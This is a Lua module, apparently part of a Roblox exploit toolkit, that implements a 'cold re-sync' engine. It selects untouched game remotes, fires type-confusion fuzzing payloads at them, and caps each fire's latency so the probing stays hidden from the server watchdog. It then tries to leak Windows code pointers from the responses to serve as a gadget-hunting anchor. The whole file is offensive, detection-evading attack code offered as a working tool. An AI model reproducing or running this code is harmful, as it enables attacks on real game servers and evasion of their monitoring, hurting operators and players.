-- ══════════════════════════════════════════════════════════════════════════════
-- BRE_COLD_SYNC — Cold-Boot Re-Sync Engine
-- PaperCuts RAE — Layer 4 BRCE Recovery
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Executed when the active Bedrock channel collapses (guard page triggered,
-- primitives voided, heartbeat flatline). Re-establishes a clean primitive
-- surface using a three-step cold strategy:
--
--   Step 1 — Tunnel Re-Sync
--     Scans STS topology for remotes that were NOT touched during the prior
--     probe session. Selects the coldest candidate and re-runs ASE Bedrock
--     handshake against it. Avoids any remote that received a naked or
--     high-latency fire in the prior session.
--
--   Step 2 — Latency-Bounded Partial Overlay Probing
--     Instead of fully naked payloads, sends "Partial Overlay" probes:
--     mostly valid payloads with a single controlled type-confusion byte.
--     Hard latency ceiling: any fire that returns in > 150ms aborts
--     immediately, purges that mutator, and moves to the next.
--     Stays invisible to the watchdog.
--
--   Step 3 — Pointer Re-Leaking
--     Uses partial overlay anomalies to leak a new live code address from
--     the fresh primitive surface. The leaked address becomes the new BGH
--     anchor — replaces the voided 0x7FF7684D1030.
--
-- ══════════════════════════════════════════════════════════════════════════════

local BCS = {}
BCS.VERSION = "1.0.0"

-- ── State ─────────────────────────────────────────────────────────────────────
BCS.STATE = {
    IDLE         = "IDLE",
    TUNNEL_SCAN  = "TUNNEL_SCAN",   -- Step 1: finding cold remote
    HANDSHAKE    = "HANDSHAKE",     -- Step 1: re-establishing Bedrock
    OVERLAY_PROBE= "OVERLAY_PROBE", -- Step 2: partial overlay probing
    PTR_LEAK     = "PTR_LEAK",      -- Step 3: extracting new anchor
    DONE         = "DONE",          -- New primitive + anchor confirmed
    ERROR        = "ERROR",
}
BCS.CurrentState = BCS.STATE.IDLE

-- ── Configuration ─────────────────────────────────────────────────────────────
local CFG = {
    -- Latency watchdog
    LatencyCeiling      = 0.150,    -- 150ms hard cap per fire
    LatencyWarmupSamples= 5,        -- samples to establish fresh baseline
    LatencyMargin       = 1.6,      -- spike multiplier to trigger abort

    -- Tunnel re-sync
    MinColdScore        = 0.70,     -- minimum "coldness" score for remote candidate
    HandshakeRetries    = 3,        -- ASE handshake attempts per candidate

    -- Partial overlay probe
    OverlayMutations    = 8,        -- overlay mutation types
    MaxOverlayPerMutation=40,       -- max fires per mutation type
    OverlayInterval     = 0.06,     -- seconds between fires (stay cool)
    AnomalyThreshold    = 0.30,     -- lower bar — partial overlays are subtle

    -- Pointer leak
    LeakCandidates      = 12,       -- top anomalies to attempt pointer extraction from
    LeakConfirmRounds   = 4,        -- confirmation fires per candidate
    AddressMinVal       = 0x7FF000000000, -- sane Windows user-space code address floor
    AddressMaxVal       = 0x7FFFFFFFFFFF, -- ceiling
}

-- ── State storage ─────────────────────────────────────────────────────────────
BCS.ColdRemote      = nil   -- selected untouched remote name
BCS.ColdRemoteInst  = nil   -- resolved instance
BCS.NewBaseline     = nil   -- fresh latency baseline
BCS.OverlayLog      = {}    -- all partial overlay probe results
BCS.Anomalies       = {}    -- overlay anomalies
BCS.NewAnchor       = nil   -- leaked code pointer (new BGH anchor)
BCS.NewPrimitive    = nil   -- confirmed primitive on cold channel
BCS.Stats           = {
    remotesScanned   = 0,
    candidatesTried  = 0,
    overlayFires     = 0,
    overlayAnomalies = 0,
    latencyAborts    = 0,
    leakAttempts     = 0,
    confirmed        = false,
}

-- ── Callbacks ─────────────────────────────────────────────────────────────────
BCS.OnStateChange   = nil   -- (newState, oldState)
BCS.OnLog           = nil   -- (level, msg)
BCS.OnTunnelFound   = nil   -- (remoteName, coldScore)
BCS.OnAnomaly       = nil   -- (anomaly)
BCS.OnAnchorLeaked  = nil   -- (address)
BCS.OnDone          = nil   -- (result)

-- ── Helpers ───────────────────────────────────────────────────────────────────
local function setState(s)
    local old = BCS.CurrentState
    BCS.CurrentState = s
    if BCS.OnStateChange then pcall(BCS.OnStateChange, s, old) end
end

local function log(level, msg)
    if BCS.OnLog then pcall(BCS.OnLog, level, msg) end
    print(string.format("[BCS][%s] %s", level, msg))
end

local function getBRE()  return _G.PC and _G.PC.BRE  end
local function getSTS()  return _G.PC and _G.PC.STS  end
local function getRSM()  return _G.PC and _G.PC.RSM  end
local function getASE()  return _G.PC and _G.PC.ASE  end
local function getBGH()  return _G.PC and _G.PC.BGH  end

-- ── Remote instance resolver ──────────────────────────────────────────────────
local function resolveInst(remoteName)
    local STS = getSTS()
    if STS and STS.Report and STS.Report.remoteIndex then
        for _, entry in ipairs(STS.Report.remoteIndex) do
            if entry.name == remoteName and entry.path then
                local ok, inst = pcall(function()
                    local parts = {}
                    for part in (entry.path .. "."):gmatch("([^.]+)%.") do
                        table.insert(parts, part)
                    end
                    local cur = game
                    for _, part in ipairs(parts) do
                        local child = cur:FindFirstChild(part)
                        if child then
                            cur = child
                        else
                            local sok, svc = pcall(function()
                                return game:GetService(part)
                            end)
                            if sok and svc then cur = svc end
                        end
                    end
                    return cur
                end)
                if ok and inst and
                   (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                    return inst
                end
            end
        end
    end

    -- Brute DataModel walk
    for _, svcName in ipairs({
        "ReplicatedStorage","ReplicatedFirst","Workspace","Players"
    }) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if ok and svc then
            local inst = svc:FindFirstChild(remoteName, true)
            if inst and
               (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                return inst
            end
        end
    end
    return nil
end

-- ── Latency-bounded fire ──────────────────────────────────────────────────────
-- Fires the remote and returns (ok, result, latency, aborted).
-- If latency exceeds ceiling, returns aborted=true immediately.

local function boundedFire(remoteInst, payload, ceiling)
    ceiling = ceiling or CFG.LatencyCeiling

    local t0     = os.clock()
    local ok, result = pcall(function()
        if remoteInst:IsA("RemoteFunction") then
            return remoteInst:InvokeServer(payload)
        else
            remoteInst:FireServer(payload)
            return nil
        end
    end)
    local latency = os.clock() - t0

    if latency > ceiling then
        BCS.Stats.latencyAborts = BCS.Stats.latencyAborts + 1
        log("ABORT", string.format(
            "Latency ceiling breached: %.0fms > %.0fms — mutator purged",
            latency * 1000, ceiling * 1000))
        return ok, result, latency, true  -- aborted=true
    end

    return ok, result, latency, false
end

-- ── Baseline recorder ─────────────────────────────────────────────────────────
local function recordBaseline(remoteInst)
    log("INFO", "Recording cold baseline...")
    local total = 0
    local errors = 0
    local N = CFG.LatencyWarmupSamples

    for i = 1, N do
        local t0 = os.clock()
        local ok = pcall(function()
            if remoteInst:IsA("RemoteFunction") then
                remoteInst:InvokeServer({ __bcs_warmup=true, n=i })
            else
                remoteInst:FireServer({ __bcs_warmup=true, n=i })
            end
        end)
        total = total + (os.clock() - t0)
        if not ok then errors = errors + 1 end
        task.wait(0.08)
    end

    local avg = total / N
    log("INFO", string.format(
        "Cold baseline: avg=%.3fs  errors=%d/%d",
        avg, errors, N))

    return {
        avgLatency = avg,
        errorRate  = errors / N,
        ceiling    = math.min(avg * CFG.LatencyMargin, CFG.LatencyCeiling),
    }
end

-- ══════════════════════════════════════════════════════════════════════════════
-- STEP 1 — TUNNEL RE-SYNC
-- ══════════════════════════════════════════════════════════════════════════════

-- Builds a "coldness score" for each known remote.
-- A remote is cold if:
--   - It appears in STS topology (exists on server)
--   - It was NOT fired during BRE probe session (not in BRE.ProbeLog)
--   - It was NOT the previous ActiveSink
--   - RSM shows low fire count (not heavily used by game logic)
--   - SBI confidence is not HIGH (avoids critical game remotes)

local function buildColdnessMap()
    local BRE   = getBRE()
    local STS   = getSTS()
    local RSM   = getRSM()
    local ASE   = getASE()

    -- Build set of "hot" remotes from BRE probe log
    local hotRemotes = {}
    if BRE and BRE.ProbeLog then
        for _, probe in ipairs(BRE.ProbeLog) do
            if probe.sinkRemote then
                hotRemotes[probe.sinkRemote] = true
            end
        end
    end

    -- Previous active sink is hot
    local prevSink = ASE and ASE.GetStats and ASE.GetStats().ActiveSink
    if prevSink then hotRemotes[prevSink] = true end

    -- Also mark anomaly remotes as hot
    if BRE and BRE.Anomalies then
        for _, a in ipairs(BRE.Anomalies) do
            if a.probe and a.probe.sinkRemote then
                hotRemotes[a.probe.sinkRemote] = true
            end
        end
    end

    -- Collect all known remotes from STS
    local candidates = {}

    if STS and STS.Report and STS.Report.remoteIndex then
        for _, entry in ipairs(STS.Report.remoteIndex) do
            local name = entry.name
            if not name or hotRemotes[name] then continue end

            BCS.Stats.remotesScanned = BCS.Stats.remotesScanned + 1

            local score = 1.0  -- start fully cold

            -- Penalize if RSM shows high fire count
            if RSM and RSM.GetRegistry then
                local ok, reg = pcall(RSM.GetRegistry)
                if ok and reg and reg[name] then
                    local fc = reg[name].fireCount or 0
                    -- High fire count = game uses it a lot = riskier to touch
                    if fc > 100 then score = score - 0.30 end
                    if fc > 500 then score = score - 0.20 end
                end
            end

            -- Penalize if SBI marked HIGH confidence (critical to game)
            local sbi = _G.PC and _G.PC.SBI
            if sbi and sbi.GetEntry then
                local ok2, sbiEntry = pcall(sbi.GetEntry, name)
                if ok2 and sbiEntry then
                    if sbiEntry.tier == "HIGH" then
                        score = score - 0.35
                    elseif sbiEntry.tier == "MEDIUM" then
                        score = score - 0.15
                    end
                end
            end

            -- Bonus if it's a RemoteFunction (returns data — better for leaking)
            if entry.remoteType == "RemoteFunction" or
               entry.class == "RemoteFunction" then
                score = score + 0.15
            end

            -- Bonus for names suggesting utility/logging (less game-critical)
            local lname = name:lower()
            if lname:find("log") or lname:find("sync") or
               lname:find("ping") or lname:find("stat") or
               lname:find("clock") or lname:find("util") or
               lname:find("debug") or lname:find("metric") or
               lname:find("report") or lname:find("telemetry") then
                score = score + 0.20
            end

            -- Clamp
            score = math.max(0, math.min(1, score))

            if score >= CFG.MinColdScore then
                table.insert(candidates, {
                    name  = name,
                    score = score,
                    entry = entry,
                })
            end
        end
    end

    -- Sort coldest first (highest score = least touched)
    table.sort(candidates, function(a,b) return a.score > b.score end)

    log("INFO", string.format(
        "Coldness map: %d remotes scanned  %d candidates (score ≥ %.2f)",
        BCS.Stats.remotesScanned, #candidates, CFG.MinColdScore))

    return candidates
end

function BCS.TunnelReSync()
    setState(BCS.STATE.TUNNEL_SCAN)
    log("INFO", "Step 1: Tunnel Re-Sync — scanning for cold remote")

    local candidates = buildColdnessMap()

    if #candidates == 0 then
        log("ERROR", "No cold candidates found — all remotes were touched")
        setState(BCS.STATE.ERROR)
        return false, "No cold remote candidates"
    end

    setState(BCS.STATE.HANDSHAKE)
    local ASE = getASE()
    if not ASE then
        setState(BCS.STATE.ERROR)
        return false, "ASE not loaded"
    end

    for _, candidate in ipairs(candidates) do
        BCS.Stats.candidatesTried = BCS.Stats.candidatesTried + 1
        local name  = candidate.name
        local score = candidate.score

        log("INFO", string.format(
            "Trying cold candidate: %s  coldScore=%.2f",
            name, score))

        -- Resolve the remote instance
        local inst = resolveInst(name)
        if not inst then
            log("INFO", name .. " — instance not resolvable, skipping")
            continue
        end

        -- Quick liveness check with a benign fire before handing to ASE
        local ok = pcall(function()
            if inst:IsA("RemoteFunction") then
                inst:InvokeServer({ __bcs_probe=true })
            else
                inst:FireServer({ __bcs_probe=true })
            end
        end)

        if not ok then
            log("INFO", name .. " — liveness check failed, skipping")
            continue
        end

        -- Attempt ASE Bedrock handshake
        local handshakeOk = false
        for attempt = 1, CFG.HandshakeRetries do
            local goal = {
                type   = ASE.GOAL and ASE.GOAL.BEDROCK or "BEDROCK",
                remote = name,
            }
            local hOk = pcall(function()
                if ASE.PursueBedrock then
                    ASE.PursueBedrock(name, { __bcs_handshake=true })
                end
            end)

            task.wait(1.5)

            local stats = ASE.GetStats and ASE.GetStats()
            if stats and stats.HeartbeatAlive and
               stats.ActiveSink == name then
                handshakeOk = true
                break
            end

            task.wait(0.5 * attempt)
        end

        if handshakeOk then
            BCS.ColdRemote     = name
            BCS.ColdRemoteInst = inst
            log("INFO", string.format(
                "Cold tunnel established on %s  (coldScore=%.2f)",
                name, score))

            if BCS.OnTunnelFound then
                pcall(BCS.OnTunnelFound, name, score)
            end
            return true, nil
        else
            log("INFO", string.format(
                "%s — handshake failed (%d attempts)",
                name, CFG.HandshakeRetries))
        end
    end

    setState(BCS.STATE.ERROR)
    log("ERROR", "Tunnel re-sync failed — no cold remote accepted handshake")
    return false, "All cold candidates rejected handshake"
end

-- ══════════════════════════════════════════════════════════════════════════════
-- STEP 2 — PARTIAL OVERLAY PROBING
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Partial Overlay probes are structurally valid payloads where exactly one
-- field carries a type-confusion value. The rest of the payload is normal
-- game-like data. This prevents the deserializer from seeing a fully alien
-- payload, staying under the watchdog's detection threshold.

local function generateOverlayProbe(mutationType, index, remoteInst)
    -- Build a "normal-looking" base payload first
    local base = {
        userId     = 1,
        action     = "update",
        value      = 1.0,
        timestamp  = os.clock(),
        version    = 1,
    }

    -- Apply exactly ONE mutation
    if mutationType == "INT_INDEX" then
        -- Swap one integer field for a boundary value
        local vals = {
            2147483647, -2147483648, 4294967295,
            0xFFFFFF, 0x10000, 0x100000,
        }
        base.userId = vals[((index-1) % #vals) + 1]

    elseif mutationType == "FLOAT_NAN" then
        -- Replace numeric with NaN/Inf variants
        local vals = {
            math.huge, -math.huge, 0/0,
            1e308, -1e308, 1e-308,
        }
        base.value = vals[((index-1) % #vals) + 1]

    elseif mutationType == "STR_NUMERIC" then
        -- Replace string field with a numeric string
        local sizes = {8, 16, 32, 64, 128, 256, 512, 1024}
        local sz = sizes[((index-1) % #sizes) + 1]
        base.action = string.rep("A", sz)

    elseif mutationType == "NIL_INJECT" then
        -- Set one field to nil (forces deserializer to handle absent key)
        local fields = {"userId","action","value","timestamp","version"}
        local f = fields[((index-1) % #fields) + 1]
        base[f] = nil

    elseif mutationType == "BOOL_SWAP" then
        -- Replace numeric with boolean
        base.userId = (index % 2 == 0)

    elseif mutationType == "NESTED_SHALLOW" then
        -- Add one level of nesting on a single field
        base.value = { inner = index, data = string.rep("x", 32) }

    elseif mutationType == "TYPE_ARRAY" then
        -- Replace action string with a mixed array
        base.action = {}
        for i = 1, math.min(index % 8 + 2, 8) do
            base.action[i] = i % 2 == 0 and i or tostring(i)
        end

    elseif mutationType == "LARGE_STRING" then
        -- Escalate one string field gradually
        local sz = math.min(index * 32, 4096)
        base.action = string.rep(string.char(65 + (index % 26)), sz)
    end

    base.__bcs_overlay = mutationType
    base.__bcs_idx     = index
    return base
end

-- Anomaly scorer for partial overlay probes
local function scoreOverlayAnomaly(baseline, result, errStr, latency)
    if not baseline then return 0, "no baseline" end

    local score   = 0
    local reasons = {}

    -- Latency: partial overlays should be FASTER than naked probes
    -- Any spike above ceiling is abort territory (handled upstream)
    -- Moderate elevation is a positive signal
    local ratio = latency / math.max(baseline.avgLatency, 0.001)
    if ratio > 1.4 and ratio < (CFG.LatencyCeiling / baseline.avgLatency) then
        score = score + 0.20
        table.insert(reasons, string.format("latency elevated %.1fx", ratio))
    end

    -- Response type changed from baseline
    if type(result) == "table" then
        score = score + 0.15
        table.insert(reasons, "table response")
        -- Check for numeric values in range (potential pointer fragment)
        for k, v in pairs(result) do
            if type(v) == "number" and v > 0x10000 then
                score = score + 0.20
                table.insert(reasons, string.format(
                    "large numeric: %s=%d", tostring(k), v))
            end
        end
    end

    if type(result) == "number" and result > 0 then
        score = score + 0.15
        table.insert(reasons, "numeric response: " .. tostring(result))
    end

    -- Error string with useful content
    if type(errStr) == "string" and #errStr > 0 then
        if errStr:find("0x") or errStr:find("address") or
           errStr:find("pointer") then
            score = score + 0.30
            table.insert(reasons, "address-like error string")
        elseif errStr:find("%d%d%d%d%d") then
            score = score + 0.15
            table.insert(reasons, "numeric error: " .. errStr:sub(1,40))
        end
    end

    return math.min(score, 1.0), table.concat(reasons, "; ")
end

function BCS.RunOverlayProbes()
    setState(BCS.STATE.OVERLAY_PROBE)

    local inst     = BCS.ColdRemoteInst
    local baseline = BCS.NewBaseline

    if not inst or not baseline then
        setState(BCS.STATE.ERROR)
        return false, "No cold remote or baseline"
    end

    log("INFO", string.format(
        "Step 2: Partial Overlay Probing on %s  ceiling=%.0fms",
        BCS.ColdRemote, baseline.ceiling * 1000))

    local MUTATION_TYPES = {
        "INT_INDEX", "FLOAT_NAN", "STR_NUMERIC",
        "NIL_INJECT", "BOOL_SWAP", "NESTED_SHALLOW",
        "TYPE_ARRAY", "LARGE_STRING",
    }

    BCS.OverlayLog = {}
    BCS.Anomalies  = {}

    for _, mutType in ipairs(MUTATION_TYPES) do
        if BCS.CurrentState ~= BCS.STATE.OVERLAY_PROBE then break end

        log("INFO", "Overlay mutation: " .. mutType)
        local mutAborts   = 0
        local mutAnomalies= 0

        for idx = 1, CFG.MaxOverlayPerMutation do
            if BCS.CurrentState ~= BCS.STATE.OVERLAY_PROBE then break end

            local payload = generateOverlayProbe(mutType, idx, inst)
            local ok, result, latency, aborted =
                boundedFire(inst, payload, baseline.ceiling)

            if aborted then
                mutAborts = mutAborts + 1
                -- If too many aborts on this mutator — purge it entirely
                if mutAborts >= 3 then
                    log("WARN", string.format(
                        "[%s] 3 latency aborts — mutator purged", mutType))
                    break
                end
                task.wait(CFG.OverlayInterval * 3)  -- cooldown after abort
                continue
            end

            BCS.Stats.overlayFires = BCS.Stats.overlayFires + 1

            local errStr = not ok and tostring(result) or nil
            local res    = ok and result or nil

            local aScore, aReason = scoreOverlayAnomaly(
                baseline, res, errStr, latency)

            local probe = {
                mutation = mutType,
                index    = idx,
                payload  = payload,
                result   = res,
                errStr   = errStr,
                latency  = latency,
                aScore   = aScore,
                aReason  = aReason,
                firedAt  = os.clock(),
            }

            table.insert(BCS.OverlayLog, probe)

            if aScore >= CFG.AnomalyThreshold then
                BCS.Stats.overlayAnomalies = BCS.Stats.overlayAnomalies + 1
                mutAnomalies = mutAnomalies + 1

                table.insert(BCS.Anomalies, probe)

                log("ANOMALY", string.format(
                    "[%s #%d] score=%.2f  lat=%.0fms  %s",
                    mutType, idx, aScore, latency*1000,
                    aReason:sub(1,60)))

                if BCS.OnAnomaly then
                    pcall(BCS.OnAnomaly, probe)
                end
            end

            task.wait(CFG.OverlayInterval)

            -- Early exit if we have strong anomalies for this mutator
            if mutAnomalies >= 5 then
                log("INFO", string.format(
                    "[%s] 5 anomalies — sufficient, moving on", mutType))
                break
            end
        end
    end

    log("INFO", string.format(
        "Overlay probing complete — %d fires  %d anomalies  %d aborts",
        BCS.Stats.overlayFires, BCS.Stats.overlayAnomalies,
        BCS.Stats.latencyAborts))

    return true, nil
end

-- ══════════════════════════════════════════════════════════════════════════════
-- STEP 3 — POINTER RE-LEAKING
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Takes the top anomaly probes and attempts to extract a valid code pointer.
-- A valid pointer is a number in the range [0x7FF000000000, 0x7FFFFFFFFFFF]
-- (64-bit Windows user-space) that is likely inside a .text segment.
-- Confirmation: fire the same payload CFG.LeakConfirmRounds times and check
-- that the leaked value is stable (same value ≥ 3/4 rounds).

local function tryExtractPointer(result, errStr)
    local candidates = {}

    -- From table response
    if type(result) == "table" then
        for k, v in pairs(result) do
            if type(v) == "number" and
               v >= CFG.AddressMinVal and v <= CFG.AddressMaxVal then
                table.insert(candidates, {val=v, src="table." .. tostring(k)})
            end
            -- Two numbers combined into a 64-bit pointer
            if type(v) == "number" and v > 0x7FFF0000 and v < 0x80000000 then
                -- This could be the high 32 bits of a pointer
                for k2, v2 in pairs(result) do
                    if k2 ~= k and type(v2) == "number" and
                       v2 >= 0 and v2 < 0x100000000 then
                        local combined = v * 0x100000000 + v2
                        if combined >= CFG.AddressMinVal and
                           combined <= CFG.AddressMaxVal then
                            table.insert(candidates, {
                                val = combined,
                                src = "combined." .. tostring(k) .. "+" .. tostring(k2)
                            })
                        end
                    end
                end
            end
        end
    end

    -- From error string
    if type(errStr) == "string" then
        -- Full 64-bit hex: 0x7FF7xxxxxxxx
        for hex in errStr:gmatch("0x(%x+)") do
            local v = tonumber(hex, 16)
            if v and v >= CFG.AddressMinVal and v <= CFG.AddressMaxVal then
                table.insert(candidates, {val=v, src="error_hex"})
            end
        end
        -- Decimal large number
        for dec in errStr:gmatch("%d%d%d%d%d%d%d%d%d%d+") do
            local v = tonumber(dec)
            if v and v >= CFG.AddressMinVal and v <= CFG.AddressMaxVal then
                table.insert(candidates, {val=v, src="error_decimal"})
            end
        end
    end

    -- From numeric response
    if type(result) == "number" and
       result >= CFG.AddressMinVal and result <= CFG.AddressMaxVal then
        table.insert(candidates, {val=result, src="numeric_direct"})
    end

    return candidates
end

function BCS.RunPointerLeak()
    setState(BCS.STATE.PTR_LEAK)
    log("INFO", "Step 3: Pointer Re-Leaking")

    local inst     = BCS.ColdRemoteInst
    local baseline = BCS.NewBaseline

    if not inst or not baseline then
        setState(BCS.STATE.ERROR)
        return false, "No cold remote"
    end

    -- Sort anomalies by score, take top candidates
    table.sort(BCS.Anomalies, function(a,b) return a.aScore > b.aScore end)
    local topN = math.min(#BCS.Anomalies, CFG.LeakCandidates)

    if topN == 0 then
        log("WARN", "No overlay anomalies to attempt pointer extraction from")
        -- Still try: fire the top mutations with fresh probes
        for mutType, _ in pairs({INT_INDEX=true, FLOAT_NAN=true}) do
            local payload = generateOverlayProbe(mutType, 1, inst)
            local ok, result, latency, aborted =
                boundedFire(inst, payload, baseline.ceiling)
            if not aborted then
                local errStr = not ok and tostring(result) or nil
                local res    = ok and result or nil
                local ptrs   = tryExtractPointer(res, errStr)
                if #ptrs > 0 then
                    table.insert(BCS.Anomalies, {
                        payload=payload, result=res,
                        errStr=errStr, aScore=0.5
                    })
                end
            end
            task.wait(0.1)
        end
    end

    for i = 1, math.min(#BCS.Anomalies, CFG.LeakCandidates) do
        local anomaly = BCS.Anomalies[i]
        BCS.Stats.leakAttempts = BCS.Stats.leakAttempts + 1

        -- Extract pointer candidates from this anomaly's response
        local ptrs = tryExtractPointer(anomaly.result, anomaly.errStr)
        if #ptrs == 0 then continue end

        -- Try to confirm the best candidate
        for _, ptr in ipairs(ptrs) do
            local hits = 0
            local totalRounds = CFG.LeakConfirmRounds

            for round = 1, totalRounds do
                local ok, result, latency, aborted =
                    boundedFire(inst, anomaly.payload, baseline.ceiling)
                if aborted then break end

                local errStr = not ok and tostring(result) or nil
                local res    = ok and result or nil

                local confirmPtrs = tryExtractPointer(res, errStr)
                for _, cp in ipairs(confirmPtrs) do
                    -- Allow ±0x1000 tolerance (same page = same module)
                    if math.abs(cp.val - ptr.val) < 0x1000 then
                        hits = hits + 1
                        break
                    end
                end
                task.wait(CFG.OverlayInterval)
            end

            local confidence = hits / totalRounds

            if confidence >= 0.60 then
                -- Confirmed pointer
                BCS.NewAnchor = ptr.val
                BCS.Stats.confirmed = true

                log("INFO", string.format(
                    "Pointer confirmed: 0x%X  conf=%.0f%%  src=%s",
                    ptr.val, confidence*100, ptr.src))

                if BCS.OnAnchorLeaked then
                    pcall(BCS.OnAnchorLeaked, ptr.val)
                end

                -- Update BGH anchor
                local BGH = getBGH()
                if BGH then
                    BGH.SetTextBounds(nil, nil)  -- clear old bounds
                    BGH.Reset()
                    -- Set new anchor in BGH config
                    rawset(require and require("bre_gadget_hunt") or BGH,
                        "_newAnchor", ptr.val)
                    -- Direct config update
                    if _G.PC.BGH_CFG then
                        _G.PC.BGH_CFG.Anchor = ptr.val
                    end
                    log("INFO", string.format(
                        "BGH anchor updated: 0x%X", ptr.val))
                end

                return true, ptr.val
            else
                log("INFO", string.format(
                    "Pointer candidate 0x%X unstable (conf=%.0f%%) — skipping",
                    ptr.val, confidence*100))
            end
        end
    end

    -- No confirmed pointer — partial success: we have a cold channel
    -- BGH can still attempt PE hunt from the anchor region of the cold remote
    log("WARN", "No stable pointer extracted — cold channel established but anchor unconfirmed")
    return false, "Pointer unstable — manual anchor required"
end

-- ══════════════════════════════════════════════════════════════════════════════
-- FULL RUN
-- ══════════════════════════════════════════════════════════════════════════════
function BCS.Run()
    if BCS.CurrentState ~= BCS.STATE.IDLE and
       BCS.CurrentState ~= BCS.STATE.ERROR and
       BCS.CurrentState ~= BCS.STATE.DONE then
        return false, "BCS already running"
    end

    -- Reset
    BCS.ColdRemote     = nil
    BCS.ColdRemoteInst = nil
    BCS.NewBaseline    = nil
    BCS.OverlayLog     = {}
    BCS.Anomalies      = {}
    BCS.NewAnchor      = nil
    BCS.NewPrimitive   = nil
    BCS.Stats          = {
        remotesScanned=0, candidatesTried=0,
        overlayFires=0, overlayAnomalies=0,
        latencyAborts=0, leakAttempts=0, confirmed=false,
    }

    log("INFO", "BCS Cold Re-Sync initiated")

    task.spawn(function()
        local ok, err = pcall(function()

            -- Step 1: Tunnel Re-Sync
            local t1Ok, t1Err = BCS.TunnelReSync()
            if not t1Ok then error(t1Err) end

            -- Record fresh baseline on cold remote
            BCS.NewBaseline = recordBaseline(BCS.ColdRemoteInst)

            -- Step 2: Partial Overlay Probing
            local t2Ok, t2Err = BCS.RunOverlayProbes()
            if not t2Ok then error(t2Err) end

            -- Step 3: Pointer Re-Leaking
            local t3Ok, t3Val = BCS.RunPointerLeak()
            -- t3Ok=false is survivable — cold channel is still useful

            setState(BCS.STATE.DONE)

            local result = {
                coldRemote = BCS.ColdRemote,
                newAnchor  = BCS.NewAnchor,
                anomalies  = #BCS.Anomalies,
                confirmed  = BCS.Stats.confirmed,
                aborts     = BCS.Stats.latencyAborts,
            }

            log("INFO", string.format(
                "Cold Re-Sync complete — channel=%s  anchor=%s  confirmed=%s",
                BCS.ColdRemote or "?",
                BCS.NewAnchor and string.format("0x%X", BCS.NewAnchor) or "none",
                tostring(BCS.Stats.confirmed)))

            if BCS.OnDone then
                pcall(BCS.OnDone, result)
            end
        end)

        if not ok then
            setState(BCS.STATE.ERROR)
            log("ERROR", tostring(err))
        end
    end)

    return true, nil
end

-- ── Reset ──────────────────────────────────────────────────────────────────────
function BCS.Reset()
    setState(BCS.STATE.IDLE)
    BCS.ColdRemote     = nil
    BCS.ColdRemoteInst = nil
    BCS.NewBaseline    = nil
    BCS.OverlayLog     = {}
    BCS.Anomalies      = {}
    BCS.NewAnchor      = nil
    BCS.NewPrimitive   = nil
    BCS.Stats          = {
        remotesScanned=0, candidatesTried=0,
        overlayFires=0, overlayAnomalies=0,
        latencyAborts=0, leakAttempts=0, confirmed=false,
    }
    log("INFO", "BCS reset")
end

-- ── GetStats ───────────────────────────────────────────────────────────────────
function BCS.GetStats()
    return {
        state          = BCS.CurrentState,
        coldRemote     = BCS.ColdRemote,
        newAnchor      = BCS.NewAnchor,
        remotesScanned = BCS.Stats.remotesScanned,
        candidatesTried= BCS.Stats.candidatesTried,
        overlayFires   = BCS.Stats.overlayFires,
        overlayAnomalies=BCS.Stats.overlayAnomalies,
        latencyAborts  = BCS.Stats.latencyAborts,
        leakAttempts   = BCS.Stats.leakAttempts,
        confirmed      = BCS.Stats.confirmed,
        anomalies      = #BCS.Anomalies,
    }
end

-- ── Export ─────────────────────────────────────────────────────────────────────
_G.PC      = _G.PC or {}
_G.PC.BCS  = BCS
print(string.format("[BCS] Cold Re-Sync Engine v%s ready.", BCS.VERSION))
